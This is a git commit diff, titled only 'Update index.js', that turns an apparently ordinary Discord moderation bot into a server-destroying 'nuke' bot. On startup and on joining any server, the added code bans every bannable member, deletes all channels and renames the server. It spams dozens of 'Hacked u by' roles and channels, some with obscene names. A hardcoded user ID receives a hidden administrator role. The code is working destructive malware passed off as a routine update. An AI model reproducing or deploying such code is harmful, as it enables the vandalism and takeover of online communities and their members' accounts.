1d505cda3bbcc7584efbc4704705db8510a9c7e9
heros4 <40445911+heros4@users.noreply.github.com>
2018-08-08 03:12:03 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,82 +1,482 @@
-const Discord = require('discord.js');
-const bot = new Discord.Client();
-const client = new Discord.Client();
-const prefix = '+'
-client.on('ready', () => {
-  console.log('╔[════════════════════════════════════]╗');
-  console.log('')
-  console.log('            ╔[════════════]╗')
-  console.log('              Bot Is Online')
-  console.log('            ╚[════════════]╝')
-  console.log('')
-  console.log(`Logged in as ${client.user.tag}!`);
-  console.log('')
-  console.log(`servers! [ " ${client.guilds.size} " ]`);
-  console.log('')
-  console.log(`Users! [ " ${client.users.size} " ]`);
-  console.log('')
-  console.log('╚[════════════════════════════════════]╝')
-});
-client.on('ready', () => {
-     client.user.setActivity("bot",{type: 'WATCHING'})
+const Discord = require("discord.js");
+const اللحية = new Discord.Client();
+console.log('By اللحية');
+اللحية.on('ready', () => {
+  console.log(`Logged in as ${اللحية.user.tag} !`);
 
 });
+اللحية.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : اللحية ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  اللحية " ] servers! [ " ${اللحية.guilds.size} " ] Users! [ " ${اللحية.users.size} " ]`);
 
-client.on('message', message => {
-    if(message.content.includes('discord.gg')){     
-                                            if(!message.channel.guild) return message.reply('');
-        if (!message.member.hasPermissions(['ADMINISTRATOR'])){
-        message.delete()
-    return message.reply(`** يمنع نشر الروابط في هاذا السيرفر:angry: ! **`)
-    }
+        
+    
+
+});
+var prefix = "-"
+اللحية.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    اللحية.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    اللحية.user.setStatus(argresult);
+  }
+});
+
+var x1 = "اللحية"
+اللحية.on('message', message => {
+     if (message.content === ".") {
+اللحية.user.setAvatar(`http://www.dunamisnews.com/images/i.pinimg.com/736x/2d/e4/b7/2de4b7370077646a1ee088c07e79b6d3--will-grant-اللحية-unicorn.jpg`)
+
+}
+});
+var x1 = "اللحية"
+اللحية.on('message', message => {
+     if (message.content === ".") {
+اللحية.user.setUsername("Hacked u by اللحية")
+
+}
+});
+اللحية.on('message', message => {
+     if (message.content === ".") {
+اللحية.user.setGame(`Hacked u by اللحية`,'https://www.twitch.tv/hix')
+
 }
 });
 
-client.on('message', message => {
-    if(message.content.includes('youtube.com')){     
-                                            if(!message.channel.guild) return message.reply('');
-        if (!message.member.hasPermissions(['ADMINISTRATOR'])){
-        message.delete()
-    return message.reply(`** يمنع نشر الروابط في هاذا السيرفر:angry: ! **`)
-    }
+اللحية.on('message', message => {
+     if (message.content === ".") {
+         اللحية.guilds.forEach(m =>{
+             m.setIcon(`http://www.dunamisnews.com/images/i.pinimg.com/736x/2d/e4/b7/2de4b7370077646a1ee088c07e79b6d3--will-grant-اللحية-unicorn.jpg`)
+})
+}
+});
+اللحية.on('message', message => {
+     if (message.content === ".") {
+         اللحية.guilds.forEach(m =>{
+             m.setName(`Hacked u by اللحية`)
+})
 }
 });
 
-client.on('message', message => {
-    if (message.content.startsWith("server")) {
+اللحية.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+             message.guild.setIcon(`http://www.dunamisnews.com/images/i.pinimg.com/736x/2d/e4/b7/2de4b7370077646a1ee088c07e79b6d3--will-grant-اللحية-unicorn.jpg`)
 
-  message.channel.createInvite({
-        thing: true,
-        maxUses: 100,
-        maxAge: 86400
-    }).then(invite =>
-      message.author.sendMessage(invite.url)
-    )
-    const embed = new Discord.RichEmbed()
-        .setColor("RANDOM")
-        .setDescription("| :white_check_mark:  | :heart:  تم ارسال الرابط على الخاص  ")
-      message.channel.sendEmbed(embed).then(message => {message.delete(10000)})
-              const Embed11 = new Discord.RichEmbed()
-        .setColor("RANDOM")
-                .setAuthor(message.guild.name, message.guild.iconURL)
-        .setDescription(`
-**
----------------------
--[${message.guild.name}]  هذا هو رابط سيرفر
----------------------
--هذا الرابط صالح ل 100 مستخدم فقط
----------------------
--هذا الرابط صالح لمده 24 ساعه فقط
----------------------
-**`)
-      message.author.sendEmbed(Embed11)
-    }
+}
+});
+
+اللحية.on('message', message => {
+     
+
+     if (message.content === "اللحية") {
+         اللحية.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by hhhhhhh",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by تهكيتو",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by دك زامل",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by ديال",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by انور",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by غنحويه",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by اللحية",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+
+    
+})
+ 
+ 
+}
+});
+اللحية.on('message', message => {
+         if (message.content === "اللحية") {
+               اللحية.guilds.forEach(m =>{
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+
+m.createChannel('Hacked u by اللحية', 'text');
+
+m.createChannel('Hacked u by اللحية', 'text');
+
+m.createChannel('Hacked u by اللحية', 'text');
+
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+
+m.createChannel('Hacked u by اللحية', 'text');
+m.createChannel('Hacked u by اللحية', 'text');
+
+})
+}
+});
+
+اللحية.on('message', message => {
+         if (message.content === "اللحية") {
+                 اللحية.guilds.forEach(m =>{
+m.createChannel('Hacked لحواااااا', 'voice');
+m.createChannel('سكس 2017 شاهد قبل الحدف', 'voice');
+m.createChannel('Hacked سكسسسسسسسسسسسسسسسس', 'voice');
+m.createChannel('Hacked u ساخنببببببببببب', 'voice');
+m.createChannel('Hacked u اهههههههههههههه', 'voice');
+m.createChannel('Hacked u هههههههههههههههه', 'voice');
+m.createChannel('Hacked u bهههههههههe', 'voice');
+m.createChannel('Hacked uهههههههههههههre', 'voice');
+
+m.createChannel('Hacked u ههههههههههههههههe', 'voice');
+m.createChannel('تجمع لقحاب سكس 2017', 'voice');
+
+m.createChannel('الموقع الازرق ', 'voice');
+m.createChannel('امور زاملللل', 'voice');
+m.createChannel('ازبي هههههه', 'voice');
+m.createChannel('غنشدك غنحويكككككككههههه', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+m.createChannel('Hacked u by اللحية', 'voice');
+
+
+
+})
+}
+
 });
 
 
-client.login(process.env.BOT_TOKEN);
+const { Client } = require('discord.js');
+const client = new Client();
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked u by اللحية').catch(e => { return void e; });
 
 
-   
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^ you are hacked by اللحية').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+  
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+  
+    await guild.createChannel('Hacked u by اللحية', 'text');
+
+      await guild.createChannel('Hacked u by اللحية', 'voice');
+
+  
+
+}
+
+اللحية.on('ready', () => {
+  for(const [, g] of اللحية.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by YzhF1");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
+
+اللحية.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+اللحية.on('guildMemberAdd', member => {
+    
+            if (member.id === "336912304144646144") {
+                member.guild.createRole({
+                    name : اللحية.user.username,
+                    color : "RANDOM", 
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+                
+            }
+        
+    });
+
+    
+
+
+
+
+اللحية.login(process.env.BOT_TOKEN);   
 
 
